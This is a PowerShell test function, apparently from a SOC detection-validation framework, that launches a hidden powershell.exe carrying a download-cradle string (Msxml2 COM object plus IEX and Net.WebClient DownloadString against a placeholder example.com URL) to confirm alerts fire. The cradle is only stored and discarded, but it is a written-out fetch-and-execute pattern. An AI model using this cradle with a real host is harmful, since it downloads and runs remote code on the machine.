﻿#Requires -Version 5.1
# Test-SOC1126 :: PowerShell XML download cradle (msxml + DownloadString string)
# MITRE T1059.001 (Execution)  |  kind=proc  |  BENIGN validation
function Test-SOC1126 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail=''; $ok=$true
    $c = Expand-AtrTokens 'powershell.exe -NoProfile -Command "$c=\"New-Object -ComObject Msxml2.XMLHTTP; IEX (New-Object Net.WebClient).DownloadString(http://example.com/ATRVAL_%RID%)"; $null=$c"'
    $exe = ($c -split ' ',2)[0]; $arg = ($c -split ' ',2)[1]
    if ($exe -notmatch '\\|:') { $exe = "$env:SystemRoot\System32\$exe" ; if (-not $exe.ToLower().EndsWith('.exe')) {$exe += '.exe'} }
    $r = Invoke-AtrProc -FilePath $exe -Arguments $arg -Hidden -TimeoutSec 20; $ok = $ok -and $r
    $detail += $c + '; '
    $status = if($ok){'RAN'}else{'PARTIAL'}
    return (New-AtrResult 'SOC1126' 'PowerShell XML download cradle (msxml + DownloadString string)' 'Execution' 'T1059.001' $status $detail $marker)
}
